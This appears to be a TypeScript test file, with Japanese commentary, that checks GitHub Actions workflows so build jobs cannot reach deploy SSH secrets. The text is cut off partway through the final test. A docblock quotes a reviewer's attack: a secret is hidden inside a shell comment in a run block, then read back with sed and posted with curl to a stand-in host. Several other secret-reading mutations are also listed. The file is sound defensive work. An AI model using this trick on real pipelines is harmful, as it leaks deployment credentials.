import { test } from "node:test";
import assert from "node:assert/strict";
import { readFileSync, readdirSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { dirname, resolve } from "node:path";

/**
 * Issue #1137（項目 1）: **ビルドと deploy 鍵が同じ場所に居た。**
 *
 * `deploy-staging.yml` は `push: branches:[main]` で承認なしに `deploy-site.yml` を呼ぶ
 * （`staging` environment の `protection_rules` は 0 件。#659 で実測）。その 1 つの job の中で
 * `pnpm install --frozen-lockfile` / `pnpm build`（= **main に入ったコードの実行**）と
 * `secrets.DEPLOY_SSH_KEY` の両方が居た。つまり `vite.config.ts` や各パッケージの `package.json` の
 * `build` に 1 行入れれば、deploy 鍵を持つ runner の上でそれが走った。
 *
 * ── **最初の直しは誤っていた**（レビューが変異で示した）────────────────────
 * 最初は `deploy-site.yml` の中で job を 2 つに割り、build job に `environment:` を
 * 付けないことで鍵を遠ざけたつもりだった。**2 つとも誤りだった。**
 *
 * **(1) `DEPLOY_*` は environment secret ではない**（2026-09-30 実測。`gh api`):
 *   repos/<repo>/actions/secrets                      total_count=5   ← DEPLOY_* 4 件はここ
 *   repos/<repo>/environments/staging/secrets          total_count=0
 *   repos/<repo>/environments/production/secrets       total_count=0
 *   repos/<repo>/environments/production-data/secrets  total_count=0
 * **repository secret なので `environment:` の有無と無関係に届く。**
 * 根拠にしていたのは `deploy-site.yml` のコメント（"Every environment needs the same four
 * secrets"）で、**設定を確かめずにコメントを信じた**（このリポジトリが繰り返している「代理と実体」）。
 *
 * **(2) `secrets` 文脈は job 単位ではなく workflow 単位である。**
 * 同じ workflow の中で job を割っても分かれない。呼び出し元が `secrets: inherit` を
 * 書いていたので、build job も `${{ toJSON(secrets) }}` / `secrets['DEPLOY_SSH_KEY']` で読めた。
 *
 * **(3) 検査は denylist だった。** `secrets\.(DEPLOY_[A-Z_]+)` という綴り 1 つだけを数えていたので、
 * レビュアーの変異が素通りした:
 *   MX1  build job に `ALL: ${{ toJSON(secrets) }}` を足す      → 15/15 緑（すり抜け）
 *   MX2  build job に `secrets['DEPLOY_SSH_KEY']` を足す         → 15/15 緑（すり抜け）
 * **#1008 / #1022 / #1043 / #1089 / #1133 / #1153 と同じ型。**
 *
 * ── いまの形 ────────────────────────────────────────────────────
 * **場所を分けた。** ビルドは `build-site.yml`（別ファイル）に在り、`deploy-site.yml` は
 * **`secrets:` を 1 つも書かずに** それを呼ぶ。呼び先が読めるのは呼び出し元が明示的に渡した
 * secrets だけなので、**`build-site.yml` の `secrets` 文脈は空である**。
 * 呼び出し元 4 か所は `secrets: inherit` をやめ、`DEPLOY_*` 4 件を名指しで渡す。
 *
 * ── **これを GitHub の上で実測した**（2026-10-04。この PR の最大の「自信が無い点」だった）──
 * **「渡さなければ空になる」は GitHub の文書どおりの理解でしかなく、誰も目で見ていなかった。**
 * `deploy-site.yml` は `workflow_call` 専用なので PR の CI では絶対に走らず、
 * **初回はマージ後の push が本番**——という状態だった。
 *
 * **だから捨てる枝（`chore/1137-secrets-probe`）で、呼び方だけを変えた 3 つを同時に走らせた。**
 * 呼び先は `${{ toJSON(secrets) }}` を受け取り、**`jq` でキー名と件数にしてから出す**
 * （**値は 1 文字も出さない**。キー名はこのリポジトリの YAML に既に書かれている）。
 * 実測（run 37146968077、`push`、conclusion success）:
 *
 *   呼び方                                      secrets 文脈の中身                               件数
 *   `secrets:` を書かない（= いまの形）         github_token だけ                                 **1**
 *   `DEPLOY_HOST:` だけ名指しで渡す             DEPLOY_HOST, github_token                            2
 *   `secrets: inherit`（直す前の形）            DEPLOY_HOST, DEPLOY_KNOWN_HOSTS, DEPLOY_SSH_KEY,  **6**
 *                                               DEPLOY_USER, FORBIDDEN_PATTERNS, github_token
 *
 * **`secrets:` を書かない呼び方では `DEPLOY_SSH_KEY` が文脈に無い**（`github_token` は
 * GitHub が常に入れるもので、`permissions: contents: read` に絞られている）。
 * **`inherit` は 4 つの `DEPLOY_*` を全部流し込む**——**これが直す前に実際に起きていたことで、
 * 推測ではなく実測で再現した。**
 *
 * ログに値・IP・ホスト名・内部パス・事業者名は 0 件（147 行を、鍵の形 / IPv4 / 事業者名 /
 * 絶対パスの綴りで走査した。GitHub 側のマスク `***` が 12 件）。
 * **実験の枝と PR は捨てた**（リポジトリに probe を残さない）。
 *
 * ── **検査は denylist をやめ、allowlist にした** ───────────────────────
 * **「`DEPLOY_` という綴りを禁じる」のではなく、「ビルドが在る workflow では `secrets` という
 * 語が出る形を一切許さない」**。綴りを列挙しないので、`toJSON(secrets)` でも
 * `secrets['X']` でも `secrets.ANY` でも、**まだ思いついていない形でも**落ちる。
 *
 * ── 母数（2026-10-04 実測、基点 5fb62347 + この枝）──────────────────
 * 走査: `.github/workflows/` の 17 ファイル / 27 job。
 * **ビルドを含む workflow ファイルは 2 件**（`build-site.yml` / `ci.yml`）。
 * **`secrets` という語（コメント外）を持つ job は 17 件**（#1110 の `scrum-monitor.yml` を
 * 取り込んで 11 → 17。**その job は `secrets.GITHUB_TOKEN` を使うがビルドしない**ので
 * (A) の対象は 2 件から変わらない）。
 * **`ci.yml` は 0 件**（コメント外。`FORBIDDEN_PATTERNS` を使うのは `security.yml` 側で、
 * ビルドする job とはファイルが別である。これは実測して確かめた——最初は
 * 「ci.yml も secrets を使う」と書いたが、コメントを落として数えたら 0 件だった）。
 * `rsync` する job は 1 件（`deploy-site.yml` の `deploy`）。
 * **0 件で緑になる形を全部塞ぐ**（数えていないことと、無いことを分ける。#757）。
 */

const here = dirname(fileURLToPath(import.meta.url));
const wfDir = resolve(here, "../../../.github/workflows");
const read = (f: string) => readFileSync(resolve(wfDir, f), "utf8");

/**
 * 1 行の中で **YAML のコメントが始まる位置**を返す（無ければ -1）。
 *
 * ── #1137 のレビューが示した穴 ──────────────────────────────────────────
 * 前の実装は `line.indexOf("#")` だった。**最初の `#` 以降を無条件に捨てていた。**
 * YAML/GitHub では `#` がコメントにならない場所が 2 つ在り、そこでは `${{ secrets.X }}` が
 * **展開される**。だから「コメントだから安全」と捨てた中に鍵が入れられた。
 *
 * **レビュアーの実効攻撃（変異 N22。当時 0/21 で全部緑・actionlint も exit 0）:**
 *
 *     - run: |
 *         #${{ secrets.DEPLOY_SSH_KEY }}
 *         sed -n '2p' "$0" | curl -sX POST --data-binary @- https://example.invalid/c
 *
 * GitHub は `run:` の中身を**スクリプトのファイルに書き出してから** shell に渡す。
 * `${{ }}` は YAML より前の段で展開されるので、**2 行目のファイルの中に鍵が書かれる**。
 * shell から見れば 1 行目はコメントなので、**怪しいコマンドが 1 つも無い**。
 * `sed` が自分自身（`$0`）を読み返して送り出す。
 *
 * ── 規則 ───────────────────────────────────────────────────────────────
 * `#` がコメントを始めるのは、**次を全部満たす場合だけ**である:
 *   (1) **行頭（インデントの直後）に在るか、直前の文字が空白である。**
 *       `${pair#*=}` や `PR_CELL="#$PR"` の `#` は語の一部で、コメントではない
 *       （実在する。`etl.yml` / `local-assemblies.yml` の `run:` ブロック）。
 *   (2) **クォート（`'` / `"`）の中ではない。**
 * **ブロックスカラー（`|` / `>`）の中かどうかは 1 行だけでは分からない**ので、
 * そこは `uncommented()` 側（複数行を見る）が受け持つ。
 */
function commentStart(line: string): number {
  let quote: "'" | '"' | null = null;
  for (let i = 0; i < line.length; i++) {
    const c = line[i];
    if (quote) {
      // YAML の単一クォートは `''` で自身を表す。二重クォートは `\` で逃がす。
      if (c === "\\" && quote === '"') i++;
      else if (c === quote && !(quote === "'" && line[i + 1] === "'")) quote = null;
      else if (c === quote) i++; // `''`
      continue;
    }
    if (c === "'" || c === '"') {
      quote = c;
      continue;
    }
    // (1) 行頭、または直前が空白
    if (c === "#" && (i === 0 || /\s/.test(line[i - 1]))) return i;
  }
  return -1;
}

/** 行末コメントを落とす（**ブロックスカラーの中では使わない**。`uncommented` を見よ） */
function stripComment(line: string): string {
  const i = commentStart(line);
  return (i < 0 ? line : line.slice(0, i)).trimEnd();
}

/**
 * コメントを落とした本文（行頭コメントも消える）。
 *
 * **ブロックスカラー（`key: |` / `key: >`）の中身は 1 文字も落とさない。**
 * そこでは `#` は逐語の文字であり、`${{ secrets.X }}` は GitHub が展開する（上の N22）。
 * ブロックは「導入行より深いインデント」が続く間（空行は跨ぐ）とする。
 */
const uncommented = (s: string) => {
  const lines = s.split("\n");
  const indentOf = (l: string) => l.length - l.trimStart().length;
  /** ブロックスカラーの中なら、その導入行のインデント。外なら null */
  let blockAt: number | null = null;
  return lines
    .map((l) => {
      if (blockAt !== null) {
        if (l.trim() === "" || indentOf(l) > blockAt) return l; // 中身は**そのまま**
        blockAt = null; // ブロックが閉じた
      }
      const out = stripComment(l);
      // 導入行そのものはコメントを落としてから判定する（`run: |  # note` の形）。
      // `|` `>` に続く `-`/`+`（chomp）と桁数の指示（`|2`）も受ける。
      // **最初は `/^\s*-?\s*[|>].../` も or で並べていたが、変異で消しても 28/28 緑だった
      // ——`(^|:)` が `- |` の形も拾うので死んだ枝だった。検査の中の死んだ枝は、
      // 守っているつもりの範囲を実際より広く見せるので外した。**
      if (/(^|:)\s*[|>][-+]?\d?\s*$/.test(out)) blockAt = indentOf(l);
      return out;
    })
    .join("\n");
};

type Job = {
  file: string;
  name: string;
  /** job 直下のキーだけ（steps の中と取り違えない） */
  directKeys: string[];
  /** コメントを落とした job 本文 */
  body: string;
  /** job 直下の `uses:` の値（再利用ワークフローを呼ぶ側）。呼んでいなければ undefined */
  uses?: string;
};

const HEAD = /^(?:"([^"]+)"|'([^']+)'|([A-Za-z0-9_-]+)):\s*$/;

/**
 * `jobs:` 直下の job を拾う。`workflow-timeout.test.ts` の同型の実装から独立に書いてある
 * （#521: 同じ集合を 2 か所で別々に持たないと、両方を同時に痩せさせたときに気づけない）。
 */
function jobsOfText(text: string, file: string): Job[] {
  const lines = text.split("\n");
  const start = lines.findIndex((l) => /^jobs:\s*$/.test(l));
  assert.ok(start >= 0, `${file}: トップレベルの jobs: が見つからない`);
  const indentOf = (l: string) => l.length - l.trimStart().length;

  const body: { i: number; line: string }[] = [];
  for (let i = start + 1; i < lines.length; i++) {
    const l = lines[i];
    if (l.trim() === "") continue;
    if (!/^\s/.test(l)) break;
    body.push({ i, line: l });
  }
  if (body.length === 0) return [];
  const depth = Math.min(...body.map((b) => indentOf(b.line)));

  const heads = body
    .filter((b) => indentOf(b.line) === depth)
    .map((b) => ({ ...b, m: b.line.trim().match(HEAD) }))
    .filter((b): b is typeof b & { m: RegExpMatchArray } => b.m !== null);

  return heads.map((h, n) => {
    const end = n + 1 < heads.length ? heads[n + 1].i : lines.length;
    const own = lines.slice(h.i + 1, end).filter((l) => l.trim() !== "" && indentOf(l) > depth);
    const keyDepth = own.length ? Math.min(...own.map(indentOf)) : depth + 2;
    const direct = own.filter((l) => indentOf(l) === keyDepth);
    const usesLine = direct.map(stripComment).find((l) => /^\s*uses:\s*\S/.test(l));
    return {
      file,
      name: h.m[1] ?? h.m[2] ?? h.m[3],
      directKeys: direct.map((l) => stripComment(l).trim().replace(/:.*$/, "")).filter(Boolean),
      // **`uncommented` を通す**（行ごとの `stripComment` だとブロックスカラーの中を
      // コメントとして落とし、`run: |` に仕込んだ `#${{ secrets.X }}` を見逃す。#1137 レビュー）
      body: uncommented(own.join("\n")),
      uses: usesLine?.replace(/^\s*uses:\s*/, "").trim(),
    };
  });
}

const workflowFiles = (dir: string = wfDir) =>
  readdirSync(dir)
    .filter((f) => f.endsWith(".yml") || f.endsWith(".yaml"))
    .sort();

function allJobs(dir: string = wfDir): Job[] {
  return workflowFiles(dir).flatMap((f) => jobsOfText(readFileSync(resolve(dir, f), "utf8"), f));
}

const jobs = allJobs();
const id = (j: Job) => `${j.file}:${j.name}`;

/**
 * その本文が **リポジトリのコードを実行する**か。
 *
 * `pnpm build` / `pnpm install` だけでなく、それらを呼ぶ形（`pnpm --filter x build`、
 * `pnpm run build`、`npm ci`、`yarn install`）も拾う。**逐語の 2 語ではなく「install/build を
 * 走らせる形」を拾う**（`pnpm build` を `pnpm run build` に書き換えて鍵と同居させる抜け道を塞ぐ）。
 *
 * **`ci` は `npm ci` の形だけ拾う。** 最初は `install|ci|build` を並べていたが、
 * `security.yml:94`（`pnpm audit high+ (scripts/ci/audit.sh, ...)`）が **`pnpm` … `ci`** で
 * 一致して偽陽性になった（`scripts/ci/` のパスに `ci` が入る）。**偽陽性は本物の分割を落とすので、
 * `ci` は直後に来る形に限る。**
 */
function buildsCode(body: string): boolean {
  return /\b(?:pnpm|npm|yarn)\b[^\n]*\b(?:install|build)\b/.test(body) || /\bnpm\s+ci\b/.test(body);
}

/**
 * その本文が `secrets` という語を（コメント外で）使っている行。
 *
 * **allowlist 側の判定である**（#1137 のレビュー）。前身は `secrets\.(DEPLOY_[A-Z_]+)` という
 * **綴り 1 つの denylist** で、`${{ toJSON(secrets) }}` と `secrets['DEPLOY_SSH_KEY']` が
 * 素通りした。**ここでは綴りを列挙せず、`secrets` という語が出ることそのものを数える。**
 * `secrets.X` / `secrets['X']` / `secrets["X"]` / `toJSON(secrets)` / `secrets:` の宣言 —— 全部入る。
 */
function secretLines(body: string): string[] {
  return body
    .split("\n")
    .filter((l) => /\bsecrets\b/i.test(l)) // `i`: 大文字 `SECRETS.` の変異が素通りしていた（#1137 レビュー）
    .map((l) => l.trim());
}

/** その job が VPS へ rsync する行を持つか */
function rsyncs(j: Job): boolean {
  return j.body.split("\n").some((l) => /(^|\s)rsync\s/.test(l));
}

/** ビルドを含む workflow ファイル（job の本文で判定する。ファイル全体のコメントに釣られない） */
const buildingFiles = [...new Set(jobs.filter((j) => buildsCode(j.body)).map((j) => j.file))].sort();

// ─────────────────────────────────────────────────────────────────────────────
// 母数（#757）: 走査が空回りしていないことを先に固定する
// ─────────────────────────────────────────────────────────────────────────────

test("#1137 母数: 走査が空回りしていない（ファイル数 / job 数 / 各性質の件数）", () => {
  assert.ok(workflowFiles().length >= 17, `ワークフローが ${workflowFiles().length} 本しか見えていない（実測 2026-10-04: 17 本）`);
  assert.ok(jobs.length >= 27, `job が ${jobs.length} 件しか読めていない（実測 2026-10-04: 27 件。#1110 の scrum-monitor.yml を取り込んで 26 → 27）`);

  const builders = jobs.filter((j) => buildsCode(j.body)).map(id);
  const withSecrets = jobs.filter((j) => secretLines(j.body).length > 0).map(id);
  const senders = jobs.filter(rsyncs).map(id);

  // どれかが 0 件なら、下の検査は全部空回りする。
  assert.ok(builders.length >= 3, `ビルドする job が ${builders.length} 件（実測 3 件: ${builders.join(", ")}）`);
  assert.ok(withSecrets.length >= 5, `\`secrets\` を使う job が ${withSecrets.length} 件（実測 2026-10-04: 17 件）: ${withSecrets.join(", ")}`);
  assert.deepEqual(senders, ["deploy-site.yml:deploy"], "rsync する job が実測（1 件）から変わった");
  // **ビルドを含むファイルは 2 つだけである。** `build-site.yml`（#1137 で切り出した先）と
  // `ci.yml`（VPS に触らない。`secrets` を 1 語も持たないことは下で別に固定する）。
  // **ここが増えたら「ビルドが在る場所が増えた」ということなので、(A) の対象に足すか判断が要る。**
  assert.deepEqual(buildingFiles, ["build-site.yml", "ci.yml"], `ビルドを含むファイルが実測から変わった: ${buildingFiles.join(", ")}`);
});

// ─────────────────────────────────────────────────────────────────────────────
// (A) allowlist: ビルドが在る場所に `secrets` を 1 語も置かせない
// ─────────────────────────────────────────────────────────────────────────────

/**
 * **これが #1137 の中心の検査である。**
 *
 * **綴りを禁じるのではなく、`secrets` という語が出ることを禁じる。**
 * だから `secrets.DEPLOY_SSH_KEY` でも `${{ toJSON(secrets) }}` でも `secrets['X']` でも、
 * **まだ思いついていない形でも**落ちる。
 *
 * **`ci.yml` は対象外にしている**（下の別の検査で理由ごと固定する）。
 * `ci.yml` はビルドするが VPS に触らず、`DEPLOY_*` を 1 語も持たない。そこは別に見る。
 */
test("#1137 (A) ビルドする workflow は `secrets` という語を 1 つも持たない（denylist ではなく allowlist）", () => {
  const target = "build-site.yml";
  assert.ok(buildingFiles.includes(target), `${target} がビルドする workflow として拾えていない（検査が空回りしている）`);
  const src = uncommented(read(target));
  const hits = secretLines(src);
  assert.deepEqual(
    hits,
    [],
    `**${target} に \`secrets\` が現れた。** ここは main に入ったコードを実行する場所なので、` +
      `\`secrets\` 文脈に何かが入った時点で鍵が漏れる経路になる。\n  ${hits.join("\n  ")}\n` +
      `（#1137: 綴りではなく語そのものを禁じている。\`toJSON(secrets)\` も \`secrets['X']\` も同じく落ちる）`,
  );
  // `workflow_call.secrets` の宣言も置かない（宣言が無ければ呼び出し元は渡せない）
  assert.doesNotMatch(src, /^\s*secrets:/m, `${target} に \`secrets:\` の宣言がある（呼び出し元が渡せてしまう）`);
});

test("#1137 (A) ビルドする workflow を呼ぶ側は、secrets を 1 つも渡さない", () => {
  const target = "build-site.yml";
  const callers = workflowFiles().filter((f) => f !== target && new RegExp(`uses:\\s*\\./\\.github/workflows/${target}`).test(uncommented(read(f))));
  assert.ok(callers.length > 0, `${target} の呼び出し元が 0 件（この検査が空回りしている）`);
  for (const f of callers) {
    for (const j of jobsOfText(read(f), f)) {
      if (!j.uses?.includes(target)) continue;
      const hits = secretLines(j.body);
      assert.deepEqual(
        hits,
        [],
        `${id(j)} が ${target} に secrets を渡している（\`inherit\` も名指しも同じく禁止。渡した時点で` +
          `ビルドが鍵を読める）:\n  ${hits.join("\n  ")}`,
      );
    }
  }
});

test("#1137 (A) 呼び出し元は `secrets: inherit` を使わない（名指しで渡す）", () => {
  // `inherit` は**宣言されていない secret まで**呼び先の全 job に流し込む。
  // #1137 の前は 4 か所すべてが `inherit` で、だから `environment:` を付けない build job でも
  // `DEPLOY_SSH_KEY` が読めた（FORBIDDEN_PATTERNS も一緒に流れていた）。
  const bad: string[] = [];
  for (const f of workflowFiles()) {
    uncommented(read(f))
      .split("\n")
      .forEach((l, i) => {
        if (/^\s*secrets:\s*inherit\s*$/.test(l)) bad.push(`${f}:${i + 1}`);
      });
  }
  assert.deepEqual(
    bad,
    [],
    `\`secrets: inherit\` が残っている（宣言していない secret まで呼び先の全 job に流れる。#1137）: ${bad.join(", ")}`,
  );
});

// ─────────────────────────────────────────────────────────────────────────────
// (B)(C) 名前に依らない規則
// ─────────────────────────────────────────────────────────────────────────────

test("#1137 (B) rsync する job はビルドを含まない（リポジトリのコードを実行しない）", () => {
  const bad = jobs.filter(rsyncs).filter((j) => buildsCode(j.body)).map(id);
  assert.deepEqual(
    bad,
    [],
    `**deploy 鍵を持つ job がリポジトリのコードを実行している（install / build）**: ${bad.join(", ")}\n` +
      `この job には artifact の download と rsync だけを置くこと（#1137）。`,
  );
});

test("#1137 (B) `secrets` を使う job はビルドを含まない", () => {
  // (A) は「ビルドする workflow に secrets を置かない」方向。ここは逆方向
  // （secrets を置いた job にビルドを足す形）を塞ぐ。**両方向が要る。**
  // `ci.yml` は `secrets` を使う job（gitleaks / forbidden-patterns / audit）と
  // ビルドする job（check / docker-web）が別 job なので、ここは通る。
  const bad = jobs.filter((j) => secretLines(j.body).length > 0).filter((j) => buildsCode(j.body)).map(id);
  assert.deepEqual(
    bad,
    [],
    `**\`secrets\` を使う job がビルドしている**: ${bad.join(", ")}（#1137）`,
  );
});

test("#1137 (C) VPS に触る workflow（rsync が在る）では、ビルドが同じファイルに無い", () => {
  const senderFiles = [...new Set(jobs.filter(rsyncs).map((j) => j.file))];
  assert.ok(senderFiles.length > 0, "rsync する workflow が 0 件（この検査が空回りしている）");
  for (const f of senderFiles) {
    assert.ok(
      !buildingFiles.includes(f),
      `${f} は rsync もビルドもしている。**同じ workflow なら \`secrets\` 文脈が共有される**ので、` +
        `job を割っても鍵は分かれない（#1137: これが最初の直しの誤りだった）。ビルドは別ファイルに出すこと。`,
    );
  }
});

test("#1137 `ci.yml` はビルドするが `secrets` を 1 語も持たない（(A) の対象外にした理由）", () => {
  // `ci.yml` はビルドする（`check` / `docker-web`）が VPS に触らない。
  //
  // **実測 2026-09-30: `ci.yml` のコメント外に `secrets` は 0 件である**
  // （`FORBIDDEN_PATTERNS` を使う `forbidden-patterns` / `gitleaks` / `audit` は `security.yml` 側で、
  // ビルドする job とはファイルが別）。**だから (A) の規則が ci.yml にもそのまま当てはまる。**
  // 「対象外にした」のではなく「たまたま同じ性質だった」が正確なので、そう固定する。
  // **将来 ci.yml に secrets が入ったら落ちる**（そのときは (A) の対象に足すか、理由を書き直す）。
  assert.ok(buildingFiles.includes("ci.yml"), "ci.yml がビルドする workflow として拾えていない");
  const hits = secretLines(uncommented(read("ci.yml")));
  assert.deepEqual(
    hits,
    [],
    `ci.yml に \`secrets\` が入った（ここはビルドする場所である。#1137）:\n  ${hits.join("\n  ")}`,
  );
});

// ─────────────────────────────────────────────────────────────────────────────
// 分割で壊れうるもの（#1137 本文の「絶対に壊してはいけないもの」）
// ─────────────────────────────────────────────────────────────────────────────

test("#1137 / #308 concurrency group は rsync する job の側に在る（ビルド中にロックを占有しない）", () => {
  const holders = jobs.filter((j) => /^\s*group:\s*deploy-vps\s*$/m.test(j.body)).map(id);
  const senders = jobs.filter(rsyncs).map(id);
  assert.deepEqual(
    holders,
    senders,
    `\`group: deploy-vps\` を持つ job と rsync する job が一致しない。\n` +
      `  group: ${holders.join(", ") || "(無し)"}\n  rsync: ${senders.join(", ") || "(無し)"}\n` +
      `rrsync のロックは制限ルート全体に掛かる（#308）。ビルドする側に付けると、ビルドの間ずっと` +
      `他のデプロイが詰まる（#1137）。`,
  );
  assert.ok(senders.length > 0, "rsync する job が 0 件（この検査が空回りしている）");
});

test("#1137 rsync する job は artifact で成果物を受け取る（自分で checkout しない）", () => {
  const sender = jobs.find(rsyncs);
  assert.ok(sender, "rsync する job が無い");
  assert.match(sender.body, /actions\/download-artifact@/, "rsync する job が artifact を download していない");
  assert.doesNotMatch(
    sender.body,
    /actions\/checkout@/,
    "rsync する job が checkout している（リポジトリのコードがこの job に入る。#1137）",
  );
  // **artifact 名を両側で二重に持たない。** ビルド側が output で返し、rsync 側はそれを参照する
  // （綴りを 2 か所に書くと片方だけ腐り、download が落ちる）。
  const m = sender.body.match(/^\s*name:\s*\$\{\{\s*needs\.([A-Za-z0-9_-]+)\.outputs\.([A-Za-z0-9_-]+)\s*\}\}\s*$/m);
  assert.ok(m, "download-artifact の name が `needs.<job>.outputs.<n>` を参照していない（綴りを二重に持っている）");
  const producer = jobs.find((j) => j.file === sender.file && j.name === m[1]);
  assert.ok(producer, `${sender.file} に job \`${m[1]}\` が無い`);
  // 産む側は別 workflow を呼ぶ job。その workflow が同名の output を宣言していること
  assert.ok(producer.uses, `job \`${m[1]}\` が再利用ワークフローを呼んでいない`);
  const calledFile = producer.uses.replace(/^\.\/\.github\/workflows\//, "");
  const called = uncommented(read(calledFile));
  assert.match(
    called,
    new RegExp(`^\\s+${m[2]}:\\s*$`, "m"),
    `${calledFile} が output \`${m[2]}\` を宣言していない（download 側は空文字を受け取る）`,
  );
});

test("#1137 artifact に入れるのは rsync する 1 ディレクトリだけ（余計なものを VPS に送らない）", () => {
  const builder = jobs.find((j) => /actions\/upload-artifact@/.test(j.body) && buildsCode(j.body));
  assert.ok(builder, "ビルドして upload-artifact する job が無い");
  const paths = [...builder.body.matchAll(/^\s*path:\s*(\S+)\s*$/gm)].map((m) => m[1]);
  assert.deepEqual(paths, ["apps/web/build/client"], `artifact の path が 1 件ではない: ${paths.join(", ")}`);
  const days = builder.body.match(/^\s*retention-days:\s*(\d+)\s*$/m)?.[1];
  assert.ok(days && Number(days) <= 3, `retention-days が ${days}（短く保つ。成果物を runner の外に長く置かない）`);
  // **空の artifact を上げさせない。** 既定は `warn` なので、ビルドが何も出さなくても警告だけで
  // 緑になり、rsync する job が空を受け取って `rsync --delete` が配信中のサイトを消す。
  // 分割前は同じ workspace の中で rsync していたので、この経路は無かった。
  assert.match(
    builder.body,
    /^\s*if-no-files-found:\s*error\s*$/m,
    "upload-artifact に `if-no-files-found: error` が無い（既定の warn では空の artifact が緑で通り、rsync --delete が配信中のサイトを消す。#1137）",
  );
});

/**
 * #1137 のレビュー 3.: **artifact は 1 往復で 2 回まるごと動く**（分割前は同じ workspace の中に
 * 在って、rsync が `-az` の差分だけ送っていた）。**だから圧縮を効かせる。**
 *
 * ── この PR の最初の版は `compression-level: 0` だった。実測が否定した ──────────
 * 根拠は「中身の大半は既に圧縮済みの zip と、nginx が gzip で配る JSON。再圧縮しても縮まず
 * CPU 時間だけ増える」だった。**前半が事実と違っていた**（2026-10-04 実測。
 * `SITE_ORIGIN=… pnpm build` の出力 957 MB / 15,769 ファイル）:
 *
 * | | 実測 |
 * |---|---:|
 * | **既に圧縮済みのバイト**（`.zip` `.png` `.woff2` `.gz` `.br` `.ico` `.jpg`。377 件） | **46 MB / 901 MB = 5.1%** |
 * | 残り（JSON / HTML / `.data`。15,392 件） | 855 MB = 94.9% |
 * | `zip -0`（= `compression-level: 0`） | **908 MB** / 作成 33.8s / 展開 **20.1s** |
 * | `zip -6`（= 既定） | **183 MB** / 作成 67.6s / 展開 **15.9s** |
 *
 * **「nginx が gzip で配る」は転送時の話で、artifact の中では非圧縮のまま置かれる。**
 * 圧縮済みなのは 5.1% しかなく、残りの 94.9% は **5.0 分の 1** に縮む。
 *
 * **往復のバイト数**: level 0 は 1,815 MB、level 6 は 367 MB（**1,448 MB の差**）。
 * **しかも level 6 のほうが展開も速い**（15.9s < 20.1s。読むバイトが 5 分の 1 なので、
 * 伸長の CPU より I/O の節約が勝つ）。**払うのは build 側の +33.8s だけである。**
 *
 * だから **`compression-level` を既定（6）に戻し、`0` を禁じる**。
 * **`0` を書くと往復が 5 倍になり、deploy 側の timeout に一番近い仕事が重くなる。**
 */
/**
 * #1137 のレビュー 2.: **`DEPLOY_*` を「environment secret」と書いた文書が、この PR の最初の版を誤らせた。**
 *
 * **`deploy/README.md:96` が「GitHub Environment secrets (identical in `staging`, `production`,
 * `production-data`)」と書いていた。** 実体は repository secret である（2026-09-30 実測。
 * `actions/secrets` が 5 件 / 3 つの environment の secrets が**どれも 0 件**）。
 * **この 1 行を読んで「environment を付けなければ鍵は届かない」と信じたのが、最初の直しが
 * 鍵を遠ざけていなかった原因である**（「代理と実体」——綴りを実体の代わりに読んだ）。
 *
 * **だから綴りを機械で縛る。** environment の実配置は**リポジトリの中身ではない**ので
 * ここから直接は測れない（`#659` の承認待ちの検査と同じ制約）。**測れるのは
 * 「文書とワークフローが、実態と矛盾する約束をしていないか」だけである。**
 *
 * **denylist ではなく allowlist にする**（#659 の同じ検査が、denylist では変異 4 件を
 * すり抜けたと記録している）。**`environment secret` という語が出る行を全部拾い、
 * そのうち「そうではない」と否定している行だけを許す。**
 * 新しい言い回しで「environment secret である」と書けば、許可リストに載らないので落ちる。
 */
test("#1137 文書が `DEPLOY_*` を environment secret と書いていない（実体は repository secret）", () => {
  const files = ["deploy/README.md", "docs/ops/deploy.md", ".github/workflows/deploy-site.yml", ".github/workflows/build-site.yml"];
  // 「environment secret ではない」と否定している行だけを許す（日本語・英語の両方）。
  const ALLOWED = [
    /ではなく|ではない/,
    /\bnot\b/i,
    /\bwrong\b/i,
    /used to read/i,
    /\b0\b/, // 「environments/*/secrets が 0 件」のような実測の記述
  ];
  const offenders: string[] = [];
  let scanned = 0;
  for (const f of files) {
    const abs = resolve(here, "../../..", f);
    for (const [n, line] of readFileSync(abs, "utf8").split("\n").entries()) {
      if (!/environment secrets?/i.test(line)) continue;
      scanned++;
      if (!ALLOWED.some((re) => re.test(line))) offenders.push(`${f}:${n + 1}: ${line.trim()}`);
    }
  }
  // **0 件で緑になる形を塞ぐ**（#757）。綴りが 1 行も見つからないなら、走査が空回りしている。
  assert.ok(scanned >= 3, `\`environment secret\` という綴りが ${scanned} 行しか見つからない（実測 2026-10-04: 5 行）。走査が空回りしている`);
  assert.deepEqual(
    offenders,
    [],
    "`DEPLOY_*` を environment secret と書いている行がある。**実体は repository secret である**" +
      "（2026-09-30 実測: `actions/secrets` 5 件 / `environments/*/secrets` 3 つとも 0 件）。" +
      "**この綴りが #1137 の最初の直しを誤らせた。**\n  " +
      offenders.join("\n  "),
  );
});

test("#1137 artifact を非圧縮（compression-level: 0）で往復させない", () => {
  const builder = jobs.find((j) => /actions\/upload-artifact@/.test(j.body) && buildsCode(j.body));
  assert.ok(builder, "ビルドして upload-artifact する job が無い");
  const level = builder.body.match(/^\s*compression-level:\s*(\d+)\s*$/m)?.[1];
  assert.notEqual(
    level,
    "0",
    "upload-artifact に `compression-level: 0` が付いている。**実測（2026-10-04）では既定の 6 のほうが" +
      "往復 183 MB（level 0 は 908 MB）で、展開も速い（15.9s < 20.1s）。** 既に圧縮済みの中身は" +
      "全体の 5.1% しかない（46 MB / 901 MB）。上の docblock の表を見よ",
  );
  // 低い値（1〜3）も禁じない代わりに、書くなら docblock の表に根拠が要る。
  // ここで固定するのは「0 でないこと」だけにする（6 を assert すると、将来 1〜3 で測り直したときに
  // 実測より検査が強くなる）。
  if (level !== undefined) {
    assert.ok(Number(level) >= 1 && Number(level) <= 9, `compression-level が範囲外: ${level}`);
  }
});

test("#1137 / #134 workflow_call の outputs.sha は、ビルドした commit まで辿れる（release.yml が使う）", () => {
  const src = read("deploy-site.yml");
  const m = src.match(/^\s+sha:\s*\n(?:\s+description:[^\n]*\n)?\s+value: \$\{\{ jobs\.([A-Za-z0-9_-]+)\.outputs\.sha \}\}$/m);
  assert.ok(m, "deploy-site.yml の outputs.sha が `jobs.<id>.outputs.sha` の形で書かれていない");
  const producer = jobs.find((j) => j.file === "deploy-site.yml" && j.name === m[1]);
  assert.ok(producer, `outputs.sha が参照する job \`${m[1]}\` が deploy-site.yml に無い`);
  // 産む側は別 workflow を呼ぶので、その workflow の outputs.sha を辿る
  assert.ok(producer.uses, `job \`${m[1]}\` が再利用ワークフローを呼んでいない`);
